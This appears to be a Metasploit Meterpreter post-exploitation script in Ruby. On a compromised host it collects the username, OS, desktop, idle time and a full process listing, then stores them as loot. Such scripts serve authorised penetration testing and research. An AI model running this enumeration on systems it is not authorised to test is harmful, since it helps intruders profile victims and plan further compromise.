##
# $Id$
##

#
# Collect basic system information
#

#
# Basic information
#
os = client.sys.config.sysinfo["OS"]

sysinfo = ""
sysinfo << " Session: #{client.session_host}\n"
sysinfo << "Username: #{client.sys.config.getuid}\n"
if os.downcase =~ /win/
	desk = client.ui.get_desktop
	sess = desk['session'] == 0xFFFFFFFF ? '' : "Session #{desk['session'].to_s}\\"
	desktop = "#{sess}#{desk['station']}\\#{desk['name']}"
	sysinfo << " Desktop: #{desktop}\n"
end

info = client.sys.config.sysinfo

sysinfo << "Computer: #{info['Computer']}\n"
sysinfo << "      OS: #{info['OS']} #{info['Architecture']} #{info['System Language']}\n"
sysinfo << " Process: #{client.sys.process.getpid}\n"
if os.downcase =~ /win/
	sysinfo << "IdleTime: #{client.ui.idle_time} seconds\n"
end

pro.store_loot("host.windows.sysinfo", "text/plain", client, sysinfo, "sysinfo.txt", "System Information")


#
# Process listing
#
processes = client.sys.process.get_processes

tbl = Rex::Text::Table.new(
	'Header'  => "Process list",
	'Indent'  => 1,
	'Columns' =>
		[
			"PID",
			"Name",
			"Arch",
			"Session",
			"User",
			"Path"
		])

processes.each do |ent|
	session = ent['session'] == 0xFFFFFFFF ? '' : ent['session'].to_s
	arch    = ent['arch']

	# for display and consistency with payload naming we switch the internal 'x86_64' value to display 'x64'
	if( arch == ARCH_X86_64 )
		arch = "x64"
	end

	tbl << [ ent['pid'].to_s, ent['name'], arch, session, ent['user'], ent['path'] ]
end

if not processes.empty?
	pro.store_loot("host.windows.processes", "text/plain", client, tbl.to_s, "processes.txt", "Process Listing")
end

